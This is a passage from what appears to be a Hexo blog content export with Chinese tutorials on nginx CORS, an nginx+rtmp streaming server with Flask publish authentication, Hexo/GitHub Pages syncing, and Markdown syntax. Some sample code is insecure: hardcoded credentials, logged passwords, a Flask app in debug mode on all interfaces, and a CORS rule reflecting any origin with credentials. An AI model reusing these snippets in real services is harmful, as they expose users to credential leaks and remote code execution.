Access-Control-Allow-Origin 中。</p><h3 id="jsonp"><a href="#jsonp" class="headerlink" title="jsonp"></a><strong>jsonp</strong></h3><p>把后端根据请求，构造json数据，并返回，前端用 jsonp 跨域。</p><p>这两种思路，本文不展开讨论。</p><p>需要说明的是，nginx 根据第一种思路，也提供了一种解决跨域的解决方案。</p><p>举例：<a href="https://link.zhihu.com/?target=http%3A//www.helloworld.com" target="_blank" rel="noopener">http://www.helloworld.com</a> 网站是由一个前端 app ，一个后端 app 组成的。前端端口号为 9000， 后端端口号为 8080。</p><p>前端和后端如果使用 http 进行交互时，请求会被拒绝，因为存在跨域问题。来看看，nginx 是怎么解决的吧：</p><p>首先，在 enable-cors.conf 文件中设置 cors ：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"># allow origin list</span><br><span class="line">set $ACAO &apos;*&apos;;</span><br><span class="line"></span><br><span class="line"># set single origin</span><br><span class="line">if ($http_origin ~* (www.helloworld.com)$) &#123;</span><br><span class="line"> set $ACAO $http_origin;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($cors = &quot;trueget&quot;) &#123;</span><br><span class="line">   add_header &apos;Access-Control-Allow-Origin&apos; &quot;$http_origin&quot;;</span><br><span class="line">   add_header &apos;Access-Control-Allow-Credentials&apos; &apos;true&apos;;</span><br><span class="line">   add_header &apos;Access-Control-Allow-Methods&apos; &apos;GET, POST, OPTIONS&apos;;</span><br><span class="line">   add_header &apos;Access-Control-Allow-Headers&apos; &apos;DNT,X-Mx-ReqToken,Keep-Alive,User-Agent,X-Requested-With,If-Modified-Since,Cache-Control,Content-Type&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($request_method = &apos;OPTIONS&apos;) &#123;</span><br><span class="line"> set $cors &quot;$&#123;cors&#125;options&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($request_method = &apos;GET&apos;) &#123;</span><br><span class="line"> set $cors &quot;$&#123;cors&#125;get&quot;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if ($request_method = &apos;POST&apos;) &#123;</span><br><span class="line"> set $cors &quot;$&#123;cors&#125;post&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来，在你的服务器中 include enable-cors.conf 来引入跨域配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># ----------------------------------------------------</span><br><span class="line"># 此文件为项目 nginx 配置片段</span><br><span class="line"># 可以直接在 nginx config 中 include（推荐）</span><br><span class="line"># 或者 copy 到现有 nginx 中，自行配置</span><br><span class="line"># www.helloworld.com 域名需配合 dns hosts 进行配置</span><br><span class="line"># 其中，api 开启了 cors，需配合本目录下另一份配置文件</span><br><span class="line"># ----------------------------------------------------</span><br><span class="line">upstream front_server&#123;</span><br><span class="line"> server www.helloworld.com:9000;</span><br><span class="line">&#125;</span><br><span class="line">upstream api_server&#123;</span><br><span class="line"> server www.helloworld.com:8080;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">server &#123;</span><br><span class="line"> listen       80;</span><br><span class="line"> server_name  www.helloworld.com;</span><br><span class="line"></span><br><span class="line"> location ~ ^/api/ &#123;</span><br><span class="line">   include enable-cors.conf;</span><br><span class="line">   proxy_pass http://api_server;</span><br><span class="line">   rewrite &quot;^/api/(.*)$&quot; /$1 break;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> location ~ ^/ &#123;</span><br><span class="line">   proxy_pass http://front_server;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nginx+rtmp</title>
      <link href="/2019/05/17/nginx-rtmp/"/>
      <url>/2019/05/17/nginx-rtmp/</url>
      
        <content type="html"><![CDATA[<h1 id="nginx-rtmp-搭建视频直播服务器"><a href="#nginx-rtmp-搭建视频直播服务器" class="headerlink" title="nginx+rtmp 搭建视频直播服务器"></a>nginx+rtmp 搭建视频直播服务器</h1><h2 id="服务器安装配置"><a href="#服务器安装配置" class="headerlink" title="服务器安装配置"></a>服务器安装配置</h2><blockquote><p><strong>windows安装包(已编译好的版本)参考：</strong></p><p><a href="http://nginx-win.ecsds.eu/" target="_blank" rel="noopener">nginx for windows</a></p><p><a href="http://blog.chinaunix.net/uid-26000296-id-5748243.html" target="_blank" rel="noopener">windows下搭建基于nginx的rtmp服务器</a></p><p><a href="https://my.oschina.net/gaga/blog/478480" target="_blank" rel="noopener">在Windows下搭建基于nginx的视频直播和点播系统</a></p></blockquote><blockquote><p><strong>搬运源码（未编译）</strong></p><p><a href="https://github.com/Car-eye-team/Car-eye-RTMP-server" target="_blank" rel="noopener">Car-eye-RTMP-server(github)</a></p><p><a href="https://github.com/Car-eye-team/car-eye-http-flv-module" target="_blank" rel="noopener">car-eye-http-flv-module</a></p></blockquote><blockquote><p><strong>nginx+rtmp在windows下编译</strong></p><p><a href="https://www.cnblogs.com/KendoCross/p/7585654.html" target="_blank" rel="noopener">Windows下编译nginx-rtmp-module</a></p><p><a href="https://blog.csdn.net/kenny25/article/details/39399689" target="_blank" rel="noopener">windows下编译nginx+nginx_rtmp_modue(vs2013)</a></p></blockquote><blockquote><p><strong>CentOS搭建nginx+rtmp服务器</strong></p><p><a href="https://www.jianshu.com/p/0a4a34d9eb8f" target="_blank" rel="noopener">nginx+rtmp直播流服务搭建 centos7</a></p><p><a href="https://blog.csdn.net/sz76211822/article/details/79225716" target="_blank" rel="noopener">centos7 Nginx+rtmp 搭建流媒体服务器</a></p></blockquote><p>linux下建议将nginx.conf中的http端口改为1024以上，好像是80端口每次运行都需要su权限。</p><p><a href="https://blog.csdn.net/shuanger_/article/details/48629163" target="_blank" rel="noopener">Nginx搭建rtmp流媒体服务器</a></p><h2 id="nginx服务器常用命令"><a href="#nginx服务器常用命令" class="headerlink" title="nginx服务器常用命令"></a>nginx服务器常用命令</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">./nginx -v//查看nginx版本号</span><br><span class="line">./nginx -V //查看nginx详细的版本信息</span><br><span class="line">start ./nginx -c conf/nginx.conf //以nginx.conf的配置启动nginx</span><br><span class="line">./nginx -s stop//停止nginx服务器</span><br><span class="line">./nginx -s quit//停止nginx服务器</span><br><span class="line">./nginx -s reload//重启nginx服务器</span><br><span class="line">service nginx reload//重启nginx服务器</span><br><span class="line">./nginx -t (-c conf/nginx.conf)//检查配置文件是否正确</span><br><span class="line">./nginx -h//显示帮助信息</span><br><span class="line">./nginx -?//显示帮助信息</span><br></pre></td></tr></table></figure><h2 id="nginx-rtmp加入权限控制"><a href="#nginx-rtmp加入权限控制" class="headerlink" title="nginx+rtmp加入权限控制"></a>nginx+rtmp加入权限控制</h2><blockquote><p>本文参考：</p><p>*<a href="https://github.com/arut/nginx-rtmp-module/wiki/Directives" target="_blank" rel="noopener">rtmp-module官方wiki</a></p><p>*<a href="http://www.cnblogs.com/zx-admin/p/5783523.html" target="_blank" rel="noopener">视频直播点播nginx-rtmp开发手册中文版(参考wiki版本粗译)</a></p><p><a href="https://blog.csdn.net/cui918/article/details/53540397#commentBox" target="_blank" rel="noopener">如何给 nginx rtmp 服务加入鉴权机制(改源码)</a></p><p>*<a href="https://blog.csdn.net/weixin_34368949/article/details/85991563" target="_blank" rel="noopener">「自己开发直播」实现nginx-rtmp-module多频道输入输出与权限控制</a></p><p><a href="https://blog.csdn.net/weixin_42579642/article/details/85263210" target="_blank" rel="noopener">nginx-rtmp-module授权机制实现直播推流多房间授权认证</a></p><p><a href="https://blog.csdn.net/iam_shuaidaile/article/details/50599943" target="_blank" rel="noopener">nginx-rtmp-module 权限控制</a></p><p><a href="https://blog.csdn.net/luoc83/article/details/79240774" target="_blank" rel="noopener">nginx-rtmp加入权限验证的简单方法</a></p><p><a href="https://blog.csdn.net/kevinw9/article/details/52984826" target="_blank" rel="noopener">视频直播点播nginx-rtmp开发手册中文版</a></p><p>*<a href="https://www.cnblogs.com/lidabo/p/7099501.html" target="_blank" rel="noopener">nginx.conf中关于nginx-rtmp-module配置指令详解</a></p><p>*<a href="https://blog.csdn.net/wei389083222/article/details/78721074/" target="_blank" rel="noopener">nginx-rtmp多房间和授权实现</a></p><blockquote><p>*博客比较有用</p></blockquote></blockquote><p>nginx的rtmp-module默认不限制推流权限、播放权限。</p><p>想加入权限验证有很多种方法。</p><p>其中一个是改源码，一个是利用nginx+rtmp的配置文件调用后台接口进行验证。</p><p>第一种方法没成功过，第二种方法比较简单。此文介绍第二种方法，第一种方法可见博客-&gt;<a href="https://blog.csdn.net/cui918/article/details/53540397#commentBox" target="_blank" rel="noopener">如何给 nginx rtmp 服务加入鉴权机制(改源码)</a></p><p>原理主要是利用on_publish跳转到当前配置的一个“location”，在这里进行验证。关键点在于rtmp application节点下面要配置“notify_method get;”为什么呢？因为跳转的时候，默认以POST方式传输参数，修改成GET方式，nginx配置里就可以轻松处理了。（当然nginx通过配置文件也可以处理post，只是复杂一些）。</p><p>我们在此使用python的后台框架flask处理on_publish的post请求。</p><p>后台返回http200即为通过验证，返回http500即为验证失败，服务器拒绝连接。</p><p>nginx的配置文件（位于nginx安装目录下：…/nginx/conf/nginx.conf）修改如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">rtmp &#123;</span><br><span class="line">server &#123;</span><br><span class="line">#listen 1935;</span><br><span class="line">listen 10077;</span><br><span class="line"></span><br><span class="line">chunk_size 4000;</span><br><span class="line">application live &#123;</span><br><span class="line">live on;</span><br><span class="line">on_publish http://localhost:10078/user/auth;//后面的url即flask监听的地址</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">application hls &#123;</span><br><span class="line">live on;</span><br><span class="line">hls on;</span><br><span class="line">#hls_path ../nginx-1.7.11.3-Gryphon/html/hls;</span><br><span class="line">hls_path ../hls;</span><br><span class="line">hls_fragment 5s;</span><br><span class="line">on_publish http://localhost:10078/user/auth;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>python的flask后台代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#https://www.jianshu.com/p/0d14ae8f081c</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#https://blog.csdn.net/wei389083222/article/details/78721074/</span></span><br><span class="line"><span class="comment">#https://blog.csdn.net/weixin_34368949/article/details/85991563</span></span><br><span class="line"><span class="comment">#验证只能用post方法</span></span><br><span class="line"><span class="comment">#虽然流密钥的格式像是get类型，但是必须使用POST获取参数。</span></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, Response</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="comment">#传入url格式为: xx.xx.xx.xx:10078/user/auth?usr=xxx&amp;passWord=xxx</span></span><br><span class="line"><span class="meta">@app.route('/user/auth',methods=['POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">auth</span><span class="params">()</span>:</span></span><br><span class="line">    usr = request.form[<span class="string">'usr'</span>]<span class="comment">#从url后获取的数据</span></span><br><span class="line">    passWord = request.form[<span class="string">'passWord'</span>]</span><br><span class="line">    print(usr,<span class="string">'\t'</span>,passWord)</span><br><span class="line">    <span class="comment">#此处可改为从数据库获取数据</span></span><br><span class="line">    auth_user=<span class="string">'abc'</span></span><br><span class="line">    auth_passWord=<span class="string">'123'</span></span><br><span class="line">    <span class="keyword">if</span> auth_user == usr <span class="keyword">and</span> auth_passWord ==passWord:</span><br><span class="line">        <span class="keyword">return</span> Response(response=<span class="string">'success'</span>,status=<span class="number">200</span>)<span class="comment">#返回200状态码</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> Response(status=<span class="number">500</span>)<span class="comment">#返回500状态码</span></span><br><span class="line">        <span class="comment">#Flask.abort(404)</span></span><br><span class="line">    <span class="keyword">return</span> passWord</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>,port=<span class="number">10078</span>,debug=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure><p>播放权限也可用类似on_publish的验证方法进行控制。</p><p>on_play和on_publish 一样，只接受post方法，若需要接受get方法需要在rtmp中application的配置中添加<pre>notify_method get;</pre>，然后可在http{}部分中处理调用（这部分语法我不太清楚，不详细展开）。</p><p>以下是nginx.conf关于on_play的用法</p><p>on_play<br>语法：on_play url<br>上下文：rtmp, server, application<br>描述：设置 HTTP 播放回调。每次一个客户分发播放命令时，一个 HTTP 请求异步发送，命令处理会挂起 - 直到它返回结果码。之后再解析 HTTP 结果码。</p><ul><li><p>HTTP 2XX 返回码的话继续 RTMP 会话。</p></li><li><p>HTTP 3XX 返回码的话 重定向 RTMP 到另一个流，这个流的名字在 HTTP 返回头的 Location 获取。如果新流的名字起始于 rtmp:// 然后远程 relay 会被创建。relay 要求 IP 地址是指定的而不是域名，并且只工作在 1.3.10 版本以上的 nginx。另请参考 notify_relay_redirect。</p></li><li><p>其他返回码的话 RTMP 连接丢弃。<br>重定向例子：</p></li></ul>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"> http &#123;</span><br><span class="line">  </span><br><span class="line">  location /local_redirect &#123;</span><br><span class="line">        rewrite ^.*$ newname? permanent;</span><br><span class="line">    &#125;</span><br><span class="line">    location /remote_redirect &#123;</span><br><span class="line">        # no domain name here, only ip</span><br><span class="line">        rewrite ^.*$ rtmp://192.168.1.123/someapp/somename? permanent;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  rtmp &#123;</span><br><span class="line">    application myapp1 &#123;</span><br><span class="line">        live on;</span><br><span class="line">        # stream will be redirected to &apos;newname&apos;</span><br><span class="line">        on_play http://localhost:8080/local_redirect;</span><br><span class="line">    &#125;</span><br><span class="line">    application myapp2 &#123;</span><br><span class="line">        live on;</span><br><span class="line">        # stream will be pulled from remote location</span><br><span class="line">        # requires nginx &gt;= 1.3.10</span><br><span class="line">        on_play http://localhost:8080/remote_redirect;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HTTP 请求接收到一些个参数。在 application/x-www-form-urlencoded MIME 类型下使用 POST 方法。以下参数会被传送给调用者：</p><ul><li>call=play。</li><li>addr - 客户端 IP 地址。</li><li>app - application 名。</li><li>flashVer - 客户端 flash 版本。</li><li>swfUrl - 客户端 swf url。</li><li>tcUrl - tcUrl。</li><li>pageUrl - 客户端页面 url。</li><li>name - 流名。<br>出了上述参数之外其他所有播放命令参数显式地发送回调。例如如果一个流由 url rtmp://localhost/app/movie?a=100&amp;b=face&amp;foo=bar 访问，然后呢 a,b 和 foo 发送回调。<br>on_play <a href="http://example.com/my_callback" target="_blank" rel="noopener">http://example.com/my_callback</a>;</li></ul><h2 id="过程中使用到的额外软件"><a href="#过程中使用到的额外软件" class="headerlink" title="过程中使用到的额外软件"></a>过程中使用到的额外软件</h2><ul><li>obs</li><li>手机端:快直播</li><li>ffmpeg推流（没用过）</li></ul>]]></content>
      
      
      <categories>
          
          <category> nginx </category>
          
      </categories>
      
      
        <tags>
            
            <tag> nginx </tag>
            
            <tag> rtmp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>hexo+gitPages Synchronization</title>
      <link href="/2019/05/16/hexo-gitPages-Synchronization/"/>
      <url>/2019/05/16/hexo-gitPages-Synchronization/</url>
      
        <content type="html"><![CDATA[<h1 id="Hexo-gitPages-的博客多端同步管理及迁移"><a href="#Hexo-gitPages-的博客多端同步管理及迁移" class="headerlink" title="Hexo+gitPages 的博客多端同步管理及迁移"></a>Hexo+gitPages 的博客多端同步管理及迁移</h1><blockquote><p>本文参考</p><p><a href="https://blog.csdn.net/Monkey_LZL/article/details/60870891" target="_blank" rel="noopener">如何解决github+Hexo的博客多终端同步问题</a></p><p><a href="https://www.jianshu.com/p/0b1fccce74e0" target="_blank" rel="noopener">利用Hexo在多台电脑上提交和更新github pages博客</a></p><p><a href="https://righere.github.io/2016/10/10/install-hexo/" target="_blank" rel="noopener">搭建hexo博客并简单的实现多终端同步</a></p><p><a href="https://www.jianshu.com/p/fceaf373d797" target="_blank" rel="noopener">hexo博客同步管理及迁移</a></p></blockquote><p>主体的思路是将博文内容相关文件放在Github项目中master中，将Hexo配置写博客用的相关文件(包括博客内容主题等等)放在Github项目的hexo分支上，这个是关键，多终端的同步只需要对分支hexo进行操作。</p><h3 id="同步的首次操作"><a href="#同步的首次操作" class="headerlink" title="同步的首次操作"></a>同步的首次操作</h3><p>在创建了博客的目录下操作，push本地文件夹Hexo中的必要文件到yourname.github.io的hexo分支上。</p><p>只托管部分用于多终端的同步的文件</p><p><strong>注意</strong>：使用第三方主题时，要删除第三方主题的.git文件夹删除，不然无法push到远程仓库</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">git init  //初始化本地仓库</span><br><span class="line">git add source //将必要的文件依次添加，有些文件夹如npm install产生的node_modules由于路径过长不好处理，所以这里没有用`git add .`命令了，而是依次添加必要文件，如下图所示,其实也可以用'git add .'命令，在.gitignore文件中加入不需要同步的文件即可</span><br><span class="line">git commit -m "Blog Source Hexo"</span><br><span class="line">git branch hexo  //新建hexo分支</span><br><span class="line">git checkout hexo  //切换到hexo分支上</span><br><span class="line">git remote add origin git@github.com:yourname/yourname.github.io.git  //将本地与Github项目对接</span><br><span class="line">git push origin hexo  //push到Github项目的hexo分支上</span><br></pre></td></tr></table></figure><p>多出来的hexo的分支，用于文件同步，原有的master分支用于部署静态博客页面</p><h3 id="在新终端进行更新博客"><a href="#在新终端进行更新博客" class="headerlink" title="在新终端进行更新博客"></a>在新终端进行更新博客</h3><p>先从github中把文件clone到本地，然后安装相应组件。然后通过git的提交同步内容，用hexo的命令部署博客到gitPages里。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git clone -b hexo git@github.com:yourname/yourname.github.io.git  //将Github中hexo分支clone到本地</span><br><span class="line">cd  yourname.github.io  //切换到刚刚clone的文件夹内</span><br><span class="line">npm install    //注意，这里一定要切换到刚刚clone的文件夹内执行，安装必要的所需组件，不用再init</span><br><span class="line">hexo new post "new blog name"   //新建一个.md文件，并编辑完成自己的博客内容</span><br><span class="line">git add source  //经测试每次只要更新sorcerer中的文件到Github中即可，因为只是新建了一篇新博客，如果更改了主题样式的话还是建议用'git add .'</span><br><span class="line">git commit -m "XX"</span><br><span class="line">git push origin hexo  //更新分支</span><br><span class="line">hexo d -g   //push更新完分支之后将自己写的博客对接到自己搭的博客网站上，同时同步了Github中的master</span><br></pre></td></tr></table></figure><h3 id="已有博客的终端更新博客"><a href="#已有博客的终端更新博客" class="headerlink" title="已有博客的终端更新博客"></a>已有博客的终端更新博客</h3><p>进入相应的文件夹，更新博客直行命令即可。</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">git pull origin hexo//先pull完成本地和远端的融合</span><br><span class="line">hexo new post <span class="string">"new blog"</span></span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"Blog update"</span></span><br><span class="line">git push origin hexo</span><br><span class="line">hexo d -g</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Markdown Syntax</title>
      <link href="/2019/05/14/Markdown-Syntax/"/>
      <url>/2019/05/14/Markdown-Syntax/</url>
      
        <content type="html"><![CDATA[<h1 id="Markdown-Syntax"><a href="#Markdown-Syntax" class="headerlink" title="Markdown Syntax"></a><center>Markdown Syntax</center></h1><blockquote><p>本文参考</p><p><a href="https://www.jianshu.com/p/191d1e21f7ed" target="_blank" rel="noopener">Markdown基本语法(简书)</a></p><p><a href="www.markdown.cn">Markdown官方文档</a></p><p><a href="https://www.jianshu.com/p/b03a8d7b1719#fnref1" target="_blank" rel="noopener">Markdown语法html支持</a></p><p><a href="http://www.pianshen.com/article/2061138675/#_51" target="_blank" rel="noopener">Markdown部分详细用法</a></p></blockquote><hr><h2 id="标题"><a href="#标题" class="headerlink" title="标题"></a>标题</h2><p>Markdown 支持两种标题的语法，类 Setext 和类 atx 形式。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Atx形式</span><br><span class="line"></span><br><span class="line"><span class="section"># 这是一级标题</span></span><br><span class="line"><span class="section">## 这是二级标题</span></span><br><span class="line"><span class="section">### 这是三级标题</span></span><br><span class="line"><span class="section">#### 这是四级标题</span></span><br><span class="line"><span class="section">##### 这是五级标题</span></span><br><span class="line"><span class="section">###### 这是六级标题</span></span><br></pre></td></tr></table></figure><h1 id="这是一级标题"><a href="#这是一级标题" class="headerlink" title="这是一级标题"></a>这是一级标题</h1><h2 id="这是二级标题"><a href="#这是二级标题" class="headerlink" title="这是二级标题"></a>这是二级标题</h2><h3 id="这是三级标题"><a href="#这是三级标题" class="headerlink" title="这是三级标题"></a>这是三级标题</h3><h4 id="这是四级标题"><a href="#这是四级标题" class="headerlink" title="这是四级标题"></a>这是四级标题</h4><h5 id="这是五级标题"><a href="#这是五级标题" class="headerlink" title="这是五级标题"></a>这是五级标题</h5><h6 id="这是六级标题"><a href="#这是六级标题" class="headerlink" title="这是六级标题"></a>这是六级标题</h6><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Setext形式</span><br><span class="line"></span><br><span class="line">This is an H1</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">This is an H2</span><br><span class="line">-------------</span><br></pre></td></tr></table></figure><h1 id="This-is-an-H1"><a href="#This-is-an-H1" class="headerlink" title="This is an H1"></a>This is an H1</h1><h2 id="This-is-an-H2"><a href="#This-is-an-H2" class="headerlink" title="This is an H2"></a>This is an H2</h2><h2 id="根据标题生成目录"><a href="#根据标题生成目录" class="headerlink" title="根据标题生成目录"></a>根据标题生成目录</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[TOC]  根据标题自动生成目录</span><br></pre></td></tr></table></figure><p>[TOC]</p><hr><h2 id="字体"><a href="#字体" class="headerlink" title="字体"></a>字体</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**这是加粗的文字**</span><br><span class="line">*这是倾斜的文字*`</span><br><span class="line">***这是斜体加粗的文字***</span><br><span class="line">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure><p><strong>加粗测试</strong></p><p><em>倾斜测试</em></p><p><strong><em>斜体加粗测试</em></strong></p><p><del>删除线测试</del></p><hr><h2 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line">&gt;&gt;这是引用的内容</span><br><span class="line">&gt;&gt;&gt;多重引用</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</span><br></pre></td></tr></table></figure><blockquote><p>引用测试一</p><blockquote><p>引用测试二</p><blockquote><p>多重引用</p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>引用测试</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><hr><h2 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">----</span><br><span class="line">***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><p>只要三个以上就可以</p><hr><hr><hr><hr><hr><h2 id="图片引用"><a href="#图片引用" class="headerlink" title="图片引用"></a>图片引用</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![<span class="string">图片alt</span>](<span class="link">图片地址 ''图片title''</span>)</span><br><span class="line"></span><br><span class="line">图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class="line">图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</span><br></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/</span><br><span class="line">u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg "区块链")</span><br></pre></td></tr></table></figure><p><img 